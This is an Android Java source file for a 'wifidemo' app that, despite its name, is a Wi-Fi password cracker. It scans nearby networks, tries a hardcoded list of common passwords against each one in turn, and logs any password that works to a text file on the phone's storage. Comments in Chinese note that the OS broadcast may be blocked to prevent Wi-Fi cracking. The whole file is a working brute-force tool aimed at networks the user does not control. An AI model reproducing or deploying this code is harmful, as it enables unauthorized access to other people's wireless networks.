package com.rair.wifidemo;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.net.wifi.ScanResult;
import android.net.wifi.SupplicantState;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.os.SystemClock;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.LinearLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    private WifiManager mWifiManager;
    private Handler mMainHandler;
    private boolean mHasPermission;
    String TAG = "MainActivity";
    private WifiManager.WifiLock wifiLock;
    private int mConnectCount;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        mWifiManager = (WifiManager) getSystemService(WIFI_SERVICE);
        mMainHandler = new Handler();
        // 创建wifi锁 -- 主要作用于息屏后使wifi一直连接 (由于电池管理为省电会息屏2分钟后关闭wifi)
        wifiLock = mWifiManager.createWifiLock("wifiLock");
        if (wifiLock != null) {
            // 使wifi锁有效  --- 主要是为了在手机锁屏后,使wifi一直连接而不断开
            wifiLock.acquire();
        }

        findChildViews();   //findviewbyid

        configChildViews(); //View的点击事件及系列视图

        mHasPermission = checkPermission(); //申请权限
        if (!mHasPermission) {
            requestPermission();
        }
        //我的手机测试过,好像这个广播不怎么有用处,可能需要运气才能反应密码错误,
        // 我设置2s后自动下个密码连接,基本这个广播没用(不知道是不是厂商屏蔽了,防止wifi密码破解)
//        registerBroadcastReceiver();    //注册广播,监听wifi连接时是否密码错误(实际效果并不怎么好用)
    }

    Button mOpenWifiButton;
    Button mGetWifiInfoButton;
    RecyclerView mWifiInfoRecyclerView;

    private void findChildViews() {
        mOpenWifiButton = (Button) findViewById(R.id.open_wifi);
        mGetWifiInfoButton = (Button) findViewById(R.id.get_wifi_info);
        mWifiInfoRecyclerView = (RecyclerView) findViewById(R.id.wifi_info_detail);
    }

    private Runnable mMainRunnable = new Runnable() {
        @Override
        public void run() {
            if (mWifiManager.isWifiEnabled()) {
                mGetWifiInfoButton.setEnabled(true);
            } else {
                mMainHandler.postDelayed(mMainRunnable, 1000);
            }
        }
    };
    String[] usePassword = {
            "12345678",
            "123456789",
            "1234567890",
            "0123456789",
            "9876543210",
            "012345678",
            "01234567",
            "87654321",
            "876543210",
            "987654321",
            "76543210",
            "88888888",
            "888888888",
            "00000000",
            "66668888",
            "88886666",
            "11223344",
            "147258369", //  手机wifi常用设置密码
            "Toppine123",   //测试
            "11111111",
            "11110000",
            "22222222",
            "33333333",
            "44444444",
            "55555555",
            "66666666",
            "77777777",
            "99999999",
            "86868686"
    };
    public static int sleep_time = 100;    //sleep_time*sleep_time_count最好不要超过5秒,有可能运行在main线程,主线程下超过5s会报无响应错误
    public int sleep_time_count = 0;    //用来计数睡眠次数的,如果睡眠超过了20次用来终止睡眠(用了2s时间)
    public List<ScanResult> mScanResultList;
    public boolean wifi_connecting = false;
    public static boolean is_password_error = false;

    private void configChildViews() {
        findViewById(R.id.pojie).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                sortList(mWifiManager.getScanResults());
                mWifiInfoRecyclerView.getAdapter().notifyDataSetChanged();
                Log.e("wifi_state", mWifiManager.getWifiState() + "state");
                if (mScanResultList == null) {
                    Toast.makeText(MainActivity.this, "没有到获取周围wifi信息", Toast.LENGTH_LONG).show();
                    return;
                }
                if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED) {
                    Toast.makeText(MainActivity.this, "你已经连接上wifi了", Toast.LENGTH_LONG).show();
                    return;
                }
                if (wifi_connecting) {
                    Toast.makeText(MainActivity.this, "正在使用常用密码连接", Toast.LENGTH_LONG).show();
                } else
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            wifi_connecting = true;
                            List<ScanResult> mscanResultList = mScanResultList;
                            for (ScanResult scanResult : mscanResultList) {
                                for (int i = 0; i < usePassword.length; i++) {
                                    if (mWifiManager.getConnectionInfo().getSupplicantState() != SupplicantState.COMPLETED) {
                                        is_password_error = false;
                                        sleep_time_count = 0;
                                        linkWifi(scanResult.SSID, usePassword[i]);
                                    } else if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED
                                            || WiFiUtil.getInstance(getApplicationContext()).isConnected(getApplicationContext())) {
                                        Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i - 1]);
                                        if (i == 0) {
                                            writePasswordToFile((mscanResultList.get((mscanResultList.indexOf(scanResult) - 1))).SSID, usePassword[usePassword.length - 1]);
                                        } else {
                                            writePasswordToFile(scanResult.SSID, usePassword[i - 1]);
                                        }
                                        //有个没有统计到,就是最后一个wifi的最后一个密码没有匹配到    --> 不管
                                        wifi_connecting = false;
                                        return;
                                    }
                                    while (!is_password_error) {
                                        SystemClock.sleep(sleep_time);
                                        sleep_time_count++;
                                        if (sleep_time_count >= 20) {
                                            Log.e(TAG, "sleep_time_count:" + sleep_time_count);
                                            is_password_error = true;//如果连接了2s没连上,认为密码错误
                                        }
                                    }

                                }
                            }
                            Looper.prepare();
                            alert();
                            Toast.makeText(MainActivity.this, "已经连接完毕,没有连接到", Toast.LENGTH_LONG).show();
                            Looper.loop();
                            wifi_connecting = false;
                        }
                    }).start();
            }
        });

        mOpenWifiButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (!mWifiManager.isWifiEnabled()) {
                    mWifiManager.setWifiEnabled(true);//开启wifi
                    mMainHandler.post(mMainRunnable);
                }
            }
        });
        mGetWifiInfoButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (mWifiManager.isWifiEnabled()) {
                    //Todo 没有mWifiManager.startScan()就可以直接getScanResults,我试过好像23版本以下就不行了
                    mWifiManager.startScan();
                    mScanResultList = mWifiManager.getScanResults();
                    sortList(mScanResultList);
                    Log.e("wifi_array_size", mScanResultList.size() + "数组");
                    mWifiInfoRecyclerView.getAdapter().notifyDataSetChanged();
                }
            }
        });

        mWifiInfoRecyclerView.setLayoutManager(
                new LinearLayoutManager(this, LinearLayoutManager.VERTICAL, false));
        mWifiInfoRecyclerView.setAdapter(new ScanResultAdapter());
    }

    public void alert() {
        new AlertDialog.Builder(this).setTitle("连接完毕").setMessage("finsh").setNegativeButton("finsh", new DialogInterface.OnClickListener() {
            @Override
            public void onClick(DialogInterface dialog, int which) {
                dialog.dismiss();
            }
        }).show();
    }

    public void linkWifi(String wifiName, String password) {
        int netId = mWifiManager.addNetwork(createWifiConfig(wifiName, password, WIFICIPHER_WPA));
        boolean enable = mWifiManager.enableNetwork(netId, true);
        boolean reconnect = mWifiManager.reconnect();
        Log.e("ZJTest", "reconnect:" + reconnect + "enable:" + enable + "  wifi_name:" + wifiName + " password:" + password);
    }

    public void writePasswordToFile(String wifiName, String password) {
        String path = Environment.getExternalStorageDirectory().getAbsolutePath();
        File file = new File(path, "/a_wifiDome_password.txt");
        FileOutputStream output = null;
        try {
            if (file.exists()) {
            } else {
                file.createNewFile();
            }
            output = new FileOutputStream(file, true);
            output.write((wifiName + "\t : password : " + password + "\t  end\n").getBytes("utf-8"));
            output.close();
        } catch (Exception e) {
            Log.e(TAG, "run: " + e.getMessage());
            e.printStackTrace();
        } finally {
            if (output != null) {
                try {
                    output.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    private void sortList(List<ScanResult> list) {
        Collections.sort(list, new Comparator<ScanResult>() {
            @Override
            public int compare(ScanResult o1, ScanResult o2) {
                return o2.level - o1.level;
            }
        });
//        TreeMap<String, ScanResult> map = new TreeMap<>();
//        for (ScanResult scanResult : list) {
//            map.put(scanResult.SSID, scanResult);
//        }
//        list.clear();
//        list.addAll(map.values());
    }

    private class ScanResultViewHolder extends RecyclerView.ViewHolder {
        private View mView;
        private TextView mWifiName;
        private TextView mWifiLevel;

        ScanResultViewHolder(View itemView) {
            super(itemView);

            mView = itemView;
            mWifiName = (TextView) itemView.findViewById(R.id.ssid);
            mWifiLevel = (TextView) itemView.findViewById(R.id.level);
        }

        void bindScanResult(final ScanResult scanResult) {
            mWifiName.setText(
                    getString(R.string.scan_wifi_name, "" + scanResult.SSID));
            mWifiLevel.setText(
                    getString(R.string.scan_wifi_level, "" + scanResult.level));

            mView.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED) {
                        Toast.makeText(MainActivity.this, "wifi已经连接了,不再连接了", Toast.LENGTH_LONG).show();
                        return;
                    }
                    if (wifi_connecting) {
                        return;
                    } else {
                        new Thread(new Runnable() {
                            @Override
                            public void run() {
                                wifi_connecting = true;
                                // 连接wifi密码  createWifiConfig(wifi名,密码,加密类型)(加密一般类型主要是WPA)
                                for (int i = 0; i < usePassword.length; i++) {
                                    //表明已经wifi连接经过了四次握手并没有连接成功
                                    if (mWifiManager.getConnectionInfo().getSupplicantState() != SupplicantState.COMPLETED
                                            || mWifiManager.getWifiState() != WifiManager.WIFI_STATE_ENABLED) {
                                        is_password_error = false;
                                        sleep_time_count = 0;
                                        linkWifi(scanResult.SSID, usePassword[i]);
                                    } else if (mWifiManager.getConnectionInfo().getSupplicantState() == SupplicantState.COMPLETED
                                            || WiFiUtil.isConnected(getApplicationContext())) {
                                        Log.e("ZJTest", "connected:" + "  wifi_name:" + scanResult.SSID + " password:" + usePassword[i - 1]);
                                        if (i == 0) {
                                            writePasswordToFile(scanResult.SSID, usePassword[usePassword.length - 1]);
                                        } else {
                                            writePasswordToFile(scanResult.SSID, usePassword[i - 1]);
                                        }
                                        wifi_connecting = false;
                                        return;
                                    }
                                    while (!is_password_error) {
                                        SystemClock.sleep(sleep_time);
                                        sleep_time_count++;
                                        if (sleep_time_count >= 20) {
                                            is_password_error = true;//如果连接了2s没连上,认为密码错误
                                            Log.e(TAG, "sleep_time_count:" + sleep_time_count);
                                        }
                                    }
                                }
                                alert();
                                wifi_connecting = false;
                            }
                        }).start();
                    }
                }
            });
        }
    }

    private static final int WIFICIPHER_NOPASS = 0;
    private static final int WIFICIPHER_WEP = 1;
    private static final int WIFICIPHER_WPA = 2;

    private WifiConfiguration createWifiConfig(String ssid, String password, int type) {
        WifiConfiguration config = new WifiConfiguration();
        config.allowedAuthAlgorithms.clear();
        config.allowedGroupCiphers.clear();
        config.allowedKeyManagement.clear();
        config.allowedPairwiseCiphers.clear();
        config.allowedProtocols.clear();
        config.SSID = "\"" + ssid + "\"";

        WifiConfiguration tempConfig = isExist(ssid);
        if (tempConfig != null) {
            mWifiManager.removeNetwork(tempConfig.networkId);
        }

        if (type == WIFICIPHER_NOPASS) {
            config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
        } else if (type == WIFICIPHER_WEP) {
            config.hiddenSSID = true;
            config.wepKeys[0] = "\"" + password + "\"";
            config.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN);
            config.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.SHARED);
            config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE);
            config.wepTxKeyIndex = 0;
        } else if (type == WIFICIPHER_WPA) {
            config.preSharedKey = "\"" + password + "\"";
            config.hiddenSSID = true;
            config.allowedAuthAlgorithms.set(WifiConfiguration.AuthAlgorithm.OPEN);
            config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.TKIP);
            config.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK);
            config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.TKIP);
            config.allowedGroupCiphers.set(WifiConfiguration.GroupCipher.CCMP);
            config.allowedPairwiseCiphers.set(WifiConfiguration.PairwiseCipher.CCMP);
            config.status = WifiConfiguration.Status.ENABLED;
        }

        return config;
    }

    private WifiConfiguration isExist(String ssid) {
        List<WifiConfiguration> configs = mWifiManager.getConfiguredNetworks();

        for (WifiConfiguration config : configs) {
            if (config.SSID.equals("\"" + ssid + "\"")) {
                return config;
            }
        }
        return null;
    }

    private class ScanResultAdapter extends RecyclerView.Adapter<ScanResultViewHolder> {
        @Override
        public ScanResultViewHolder onCreateViewHolder(ViewGroup parent, int viewType) {
            View view = LayoutInflater.from(getApplicationContext())
                    .inflate(R.layout.item_scan_result, parent, false);

            return new ScanResultViewHolder(view);
        }

        @Override
        public void onBindViewHolder(ScanResultViewHolder holder, int position) {
            if (mScanResultList != null) {
                holder.bindScanResult(mScanResultList.get(position));
            }
        }

        @Override
        public int getItemCount() {
            if (mScanResultList == null) {
                return 0;
            } else {
                return mScanResultList.size();
            }
        }
    }

    private static final String[] NEEDED_PERMISSIONS = new String[]{
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_EXTERNAL_STORAGE
    };

    private boolean checkPermission() {
        for (String permission : NEEDED_PERMISSIONS) {
            if (ActivityCompat.checkSelfPermission(this, permission)
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        return true;
    }

    private static final int PERMISSION_REQUEST_CODE = 0;

    private void requestPermission() {
        ActivityCompat.requestPermissions(this,
                NEEDED_PERMISSIONS, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onResume() {
        super.onResume();
        if (mWifiManager.isWifiEnabled() && mHasPermission) {
            mGetWifiInfoButton.setEnabled(true);
//            mGetWifiInfoButton.callOnClick();
            mScanResultList = mWifiManager.getScanResults();
            sortList(mScanResultList);
            Log.e("wifi_array_size", mScanResultList.size() + "数组");
            mWifiInfoRecyclerView.getAdapter().notifyDataSetChanged();

        } else {
            mGetWifiInfoButton.setEnabled(false);
            if (mScanResultList != null) {
                mScanResultList.clear();
                mWifiInfoRecyclerView.getAdapter().notifyDataSetChanged();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions, @NonNull int[] grantResults) {
        boolean hasAllPermission = true;

        if (requestCode == PERMISSION_REQUEST_CODE) {
            for (int i : grantResults) {
                if (i != PackageManager.PERMISSION_GRANTED) {
                    hasAllPermission = false;
                    break;
                }
            }

            if (hasAllPermission) {
                mHasPermission = true;
            } else {
                mHasPermission = false;
                Toast.makeText(
                        this, "Need More Permission",
                        Toast.LENGTH_LONG)
                        .show();
            }
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        unregisterBroadcastReceiver();
        //        //判断wifi是否被lock锁持用
        if (wifiLock.isHeld()) {
            // 释放锁
            wifiLock.release();
        }
    }

    private BroadcastReceiver mBroadcastReceiver;

    private void registerBroadcastReceiver() {
        mBroadcastReceiver = new BroadcastReceiver() {  //发现不仅不能有作用,本来能连接的wifi经过这个还不能连接
            @Override
            public void onReceive(Context context, Intent intent) {
                if (intent.getAction().equals(WifiManager.WIFI_STATE_CHANGED_ACTION)) {
                    int message = intent.getIntExtra(WifiManager.EXTRA_WIFI_STATE, -1);
                    switch (message) {
                        case WifiManager.WIFI_STATE_DISABLED:
                            //Toast.makeText(getApplicationContext(), "不可用", Toast.LENGTH_SHORT).show();
                            break;
                        case WifiManager.WIFI_STATE_DISABLING:
                            //Toast.makeText(getApplicationContext(), "正在关闭或者断开", Toast.LENGTH_SHORT).show();
                            break;
                        case WifiManager.WIFI_STATE_ENABLED:
                            //Toast.makeText(getApplicationContext(), "可用", Toast.LENGTH_SHORT).show();
                            break;
                        case WifiManager.WIFI_STATE_ENABLING:
                            //Toast.makeText(getApplicationContext(), "正在打开或者连接", Toast.LENGTH_SHORT).show();
                            break;
                        case WifiManager.WIFI_STATE_UNKNOWN:
                            //Toast.makeText(getApplicationContext(), "未知", Toast.LENGTH_SHORT).show();
                            break;
                        default:
                            break;
                    }
                } else if (intent.getAction().equals(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION)) {
//                    WifiInfo wifiInfo = mWifiManager.getWifiInfo();
                    WifiInfo wifiInfo = mWifiManager.getConnectionInfo();
                    SupplicantState state = wifiInfo.getSupplicantState();
                    String str = "未知";
                    if (state == SupplicantState.SCANNING) {
                        str = "正在扫描";
                    }
                    if (state == SupplicantState.ASSOCIATED) {
                        str = "关联AP成功";
                    } else if (state.toString().equals("AUTHENTICATING")) {
                        str = "正在验证";
                    } else if (state == SupplicantState.ASSOCIATING) {
                        str = "正在关联AP...";
                    } else if (state == SupplicantState.COMPLETED) {
                        str = "连接成功";
                    } else if (state == SupplicantState.INACTIVE) {

                    } else if (state.toString().equals("DISCONNECTED")) {   //有时并不能及时反应出来,有时正确密码连接时会走这里
                        str = "连接不成功";
                        Log.e(TAG, "mConnectCount: " + mConnectCount);
                        if (mConnectCount < 1)
                            mConnectCount++;
                        else {
                            is_password_error = true;
                            mConnectCount = 0;
//                            Toast.makeText(getApplicationContext(), "密码错误", Toast.LENGTH_SHORT).show();
                        }
                    }
                    //Toast.makeText(getApplicationContext(),str, Toast.LENGTH_SHORT).show();
                    Log.e(TAG, "连接状态: "+str+ "连接WiFi名:"+intent.getStringExtra(WifiManager.EXTRA_BSSID));
                }
                int linkWifiResult = intent.getIntExtra(WifiManager.EXTRA_SUPPLICANT_ERROR, 123);
                Log.e(TAG, "wifi_link_error" + linkWifiResult);    //大多数返回123
                if (linkWifiResult == WifiManager.ERROR_AUTHENTICATING) {
                    is_password_error = true;   //监听到连接wifi验证错误,改变flag
                }
            }
        };

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction(WifiManager.NETWORK_STATE_CHANGED_ACTION);   //监听网络状态改变
        intentFilter.addAction(WifiManager.SUPPLICANT_STATE_CHANGED_ACTION);
        registerReceiver(mBroadcastReceiver, intentFilter);
    }

    private void unregisterBroadcastReceiver() {
        this.unregisterReceiver(mBroadcastReceiver);
    }
}
